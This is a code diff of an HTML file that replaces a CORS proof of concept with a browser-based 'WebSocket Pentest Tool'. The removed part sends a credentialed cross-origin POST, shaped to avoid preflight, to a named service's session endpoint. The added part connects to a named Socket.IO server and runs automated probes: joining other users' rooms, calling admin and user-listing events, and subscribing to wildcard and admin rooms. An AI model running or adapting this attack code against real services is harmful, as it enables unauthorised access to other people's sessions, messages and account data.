@@ -1,44 +1,360 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8" />
-  <title>CORS PoC — clerk.upstash.com</title>
+    <title>WebSocket Pentest Tool</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            margin: 20px;
+            background: #0f0f23;
+            color: #00ff00;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+        .panel {
+            background: #1a1a2e;
+            border: 1px solid #00ff00;
+            border-radius: 5px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        .controls {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        button {
+            background: #00ff00;
+            color: #000;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #00cc00;
+        }
+        button.stop {
+            background: #ff4444;
+            color: white;
+        }
+        button.stop:hover {
+            background: #cc0000;
+        }
+        #status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 3px;
+            font-weight: bold;
+        }
+        .connected { background: #1a3c1a; color: #4dff4d; }
+        .disconnected { background: #3c1a1a; color: #ff4d4d; }
+        .connecting { background: #3c3c1a; color: #ffff4d; }
+        
+        #output {
+            height: 500px;
+            overflow-y: auto;
+            background: #000;
+            padding: 15px;
+            border-radius: 3px;
+            white-space: pre-wrap;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+        }
+        
+        .message {
+            margin: 5px 0;
+            padding: 5px;
+            border-left: 3px solid #444;
+        }
+        .incoming { border-left-color: #00ff00; }
+        .outgoing { border-left-color: #ff9900; }
+        .error { border-left-color: #ff4444; color: #ff8888; }
+        .success { border-left-color: #00ffff; color: #88ffff; }
+        
+        .timestamp {
+            color: #888;
+            font-size: 10px;
+        }
+        
+        .test-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 15px;
+        }
+        
+        .test-btn {
+            background: #2a2a4a;
+            color: #ccc;
+            border: 1px solid #444;
+            padding: 8px;
+            text-align: left;
+            cursor: pointer;
+            font-size: 11px;
+        }
+        
+        .test-btn:hover {
+            background: #3a3a5a;
+            border-color: #00ff00;
+        }
+    </style>
 </head>
 <body>
-  <h3>CORS PoC: POST to clerk.upstash.com (with credentials)</h3>
-  <div id="out">Waiting...</div>
+    <div class="container">
+        <h1>🔍 WebSocket Pentest Tool</h1>
+        
+        <div class="panel">
+            <h3>Target: <span id="targetUrl">wss://api.vida.dev/socket.io/?EIO=4&transport=websocket</span></h3>
+            
+            <div class="controls">
+                <button onclick="connectWebSocket()" id="connectBtn">🟢 Connect</button>
+                <button onclick="disconnectWebSocket()" id="disconnectBtn" class="stop">🔴 Disconnect</button>
+                <button onclick="clearOutput()">🧹 Clear</button>
+                <button onclick="runAutoTest()">🚀 Run Auto-Test</button>
+            </div>
+            
+            <div id="status" class="disconnected">Status: Disconnected</div>
+        </div>
+        
+        <div class="panel">
+            <h3>📡 Live Traffic</h3>
+            <div id="output"></div>
+        </div>
+        
+        <div class="panel">
+            <h3>⚡ Quick Tests</h3>
+            <div class="test-buttons">
+                <button class="test-btn" onclick="sendPacket('40')">Connect Namespace</button>
+                <button class="test-btn" onclick="sendPacket('42["subscribe","2594424:2594424"]')">Subscribe to Room</button>
+                <button class="test-btn" onclick="sendPacket('42["join","2594424:2594424"]')">Join Room</button>
+                <button class="test-btn" onclick="sendPacket('42["getMessages",{"roomId":"2594424:2594424"}]')">Get Messages</button>
+                <button class="test-btn" onclick="sendPacket('42["message","ping"]')">Send "ping"</button>
+                <button class="test-btn" onclick="sendPacket('42["auth",{"token":"test"}])')">Auth with Token</button>
+                <button class="test-btn" onclick="sendPacket('2probe')">Send Probe</button>
+                <button class="test-btn" onclick="sendPacket('2')">Ping</button>
+                <button class="test-btn" onclick="sendPacket('42["admin","stats"]')">Admin Stats</button>
+                <button class="test-btn" onclick="sendPacket('42["getUsers",{}]')">Get Users</button>
+                <button class="test-btn" onclick="sendPacket('42["getAllRooms",{}]')">Get All Rooms</button>
+            </div>
+        </div>
+        
+        <div class="panel">
+            <h3>🎯 Custom Command</h3>
+            <input type="text" id="customCmd" placeholder='e.g., 42["subscribe","room:123"]' style="width: 70%; padding: 10px; background: #000; color: #0f0; border: 1px solid #444;">
+            <button onclick="sendCustom()" style="margin-left: 10px;">Send</button>
+        </div>
+    </div>
 
-  <script>
-    (async function() {
-      const out = msg => {
-        document.getElementById('out').innerText = msg;
-        console.log(msg);
-      };
-
-      out('Sending POST to https://clerk.upstash.com/v1/client/sessions/sess_36eb3pUKqmfrBpPJjnntBlfJULJ/touch');
-
-      try {
-        // Use a simple Content-Type to avoid preflight when possible:
-        // text/plain is a "simple" header and will not trigger preflight.
-        const resp = await fetch('https://clerk.upstash.com/v1/client/sessions/sess_36eb3pUKqmfrBpPJjnntBlfJULJ/touch', {
-          method: 'POST',
-          mode: 'cors',                 // allow CORS
-          credentials: 'include',       // include cookies
-          headers: {
-            'Content-Type': 'text/plain' // a simple content-type (may avoid preflight)
-          },
-          body: 'ping' // body can be empty or small text
+    <script>
+        let ws = null;
+        let sessionId = null;
+        let messageCount = 0;
+        
+        function logMessage(type, message, data = null) {
+            const output = document.getElementById('output');
+            const timestamp = new Date().toLocaleTimeString();
+            const msgId = ++messageCount;
+            
+            const msgDiv = document.createElement('div');
+            msgDiv.className = `message ${type}`;
+            msgDiv.innerHTML = `
+                <div class="timestamp">[${timestamp}] #${msgId}</div>
+                <div class="content">${escapeHtml(message)}</div>
+                ${data ? `<div class="data">${escapeHtml(JSON.stringify(data, null, 2))}</div>` : ''}
+            `;
+            
+            output.appendChild(msgDiv);
+            output.scrollTop = output.scrollHeight;
+        }
+        
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+        
+        function updateStatus(status, className) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.textContent = `Status: ${status}`;
+            statusDiv.className = className;
+        }
+        
+        function connectWebSocket() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                logMessage('error', 'WebSocket is already connected!');
+                return;
+            }
+            
+            const url = 'wss://api.vida.dev/socket.io/?EIO=4&transport=websocket';
+            logMessage('outgoing', `Connecting to: ${url}`);
+            updateStatus('Connecting...', 'connecting');
+            
+            ws = new WebSocket(url);
+            
+            ws.onopen = function() {
+                logMessage('success', '✅ WebSocket connection established!');
+                updateStatus('Connected', 'connected');
+                document.getElementById('connectBtn').disabled = true;
+                document.getElementById('disconnectBtn').disabled = false;
+            };
+            
+            ws.onclose = function(event) {
+                logMessage('error', `❌ Connection closed. Code: ${event.code}, Reason: ${event.reason || 'none'}`);
+                updateStatus('Disconnected', 'disconnected');
+                document.getElementById('connectBtn').disabled = false;
+                document.getElementById('disconnectBtn').disabled = true;
+                sessionId = null;
+            };
+            
+            ws.onerror = function(error) {
+                logMessage('error', '❌ WebSocket error occurred');
+                console.error('WebSocket error:', error);
+            };
+            
+            ws.onmessage = function(event) {
+                const data = event.data;
+                logMessage('incoming', `📥 ${data}`);
+                
+                // Parse Socket.IO packets
+                if (data.startsWith('0')) {
+                    try {
+                        const handshake = JSON.parse(data.substring(1));
+                        sessionId = handshake.sid;
+                        logMessage('success', `📝 Session ID: ${sessionId}`);
+                        
+                        // Auto-complete handshake
+                        setTimeout(() => {
+                            sendPacket('2probe');
+                            setTimeout(() => sendPacket('40'), 100);
+                        }, 100);
+                    } catch (e) {
+                        logMessage('error', `Failed to parse handshake: ${e.message}`);
+                    }
+                }
+                else if (data === '3probe') {
+                    logMessage('success', '🔍 Probe received, completing handshake...');
+                    setTimeout(() => sendPacket('5'), 100);
+                }
+                else if (data.startsWith('40')) {
+                    logMessage('success', '✅ Connected to Socket.IO namespace!');
+                    try {
+                        const nsData = JSON.parse(data.substring(2));
+                        if (nsData.sid) {
+                            logMessage('success', `🆔 Namespace SID: ${nsData.sid}`);
+                        }
+                    } catch (e) {}
+                }
+                else if (data.startsWith('42')) {
+                    try {
+                        const payload = JSON.parse(data.substring(2));
+                        logMessage('incoming', `🎯 Event: ${payload[0]}`, payload[1]);
+                    } catch (e) {
+                        logMessage('incoming', `Event data: ${data.substring(2)}`);
+                    }
+                }
+                else if (data === '3' || data === '2') {
+                    // Ping/pong
+                    logMessage('success', '♻️ Keep-alive packet');
+                }
+                else {
+                    logMessage('incoming', `Raw: ${data}`);
+                }
+            };
+        }
+        
+        function disconnectWebSocket() {
+            if (ws) {
+                ws.close();
+                logMessage('error', '🛑 Manually disconnected');
+            }
+        }
+        
+        function clearOutput() {
+            document.getElementById('output').innerHTML = '';
+            messageCount = 0;
+            logMessage('success', 'Output cleared');
+        }
+        
+        function sendPacket(packet) {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                logMessage('error', 'Cannot send: WebSocket not connected');
+                return;
+            }
+            
+            logMessage('outgoing', `📤 ${packet}`);
+            ws.send(packet);
+        }
+        
+        function sendCustom() {
+            const input = document.getElementById('customCmd');
+            const cmd = input.value.trim();
+            if (cmd) {
+                sendPacket(cmd);
+                input.value = '';
+            }
+        }
+        
+        function runAutoTest() {
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                logMessage('error', 'Connect first before running tests');
+                return;
+            }
+            
+            logMessage('success', '🚀 Starting automated tests...');
+            
+            // Test sequence with delays
+            const tests = [
+                {delay: 500, packet: '42["subscribe","2594424:2594424"]'},
+                {delay: 500, packet: '42["join","2594424:2594424"]'},
+                {delay: 500, packet: '42["getMessages",{"roomId":"2594424:2594424"}]'},
+                {delay: 500, packet: '42["message","test"]'},
+                {delay: 500, packet: '42["ping",{}]'},
+                {delay: 500, packet: '42["auth",{"token":"test"}]'},
+                {delay: 500, packet: '42["identify",{"user":"test"}]'},
+                {delay: 500, packet: '42["room","2594424:2594424"]'},
+                {delay: 500, packet: '42["chat","2594424:2594424"]'},
+                {delay: 500, packet: '42["notifications",{}]'},
+                {delay: 500, packet: '42["presence",{}]'},
+                {delay: 500, packet: '42["typing",{"roomId":"2594424:2594424"}]'},
+                // Try some admin endpoints
+                {delay: 500, packet: '42["admin","stats"]'},
+                {delay: 500, packet: '42["getUsers",{}]'},
+                {delay: 500, packet: '42["getAllRooms",{}]'},
+                // Try pattern room IDs
+                {delay: 500, packet: '42["subscribe","admin:admin"]'},
+                {delay: 500, packet: '42["subscribe","support:*"]'},
+                {delay: 500, packet: '42["subscribe","broadcast"]'},
+            ];
+            
+            let totalDelay = 0;
+            tests.forEach(test => {
+                totalDelay += test.delay;
+                setTimeout(() => {
+                    sendPacket(test.packet);
+                }, totalDelay);
+            });
+            
+            logMessage('success', `⏱️ Running ${tests.length} tests over ${totalDelay/1000} seconds`);
+        }
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.key === 'Enter') {
+                sendCustom();
+            }
+            if (e.key === 'Escape') {
+                clearOutput();
+            }
         });
-
-        out(`Response status: ${resp.status} ${resp.statusText}`);
-
-        // Try to read body (only if CORS allows it)
-        const text = await resp.text();
-        out(`Response body (first 1000 chars):\n${text.slice(0,1000)}`);
-      } catch (err) {
-        out('Fetch error (likely blocked by CORS or network): ' + err);
-      }
-    })();
-  </script>
+        
+        // Auto-connect on page load
+        window.onload = function() {
+            logMessage('success', '🔧 WebSocket Pentest Tool loaded. Click "Connect" to start.');
+        };
+    </script>
 </body>
 </html>
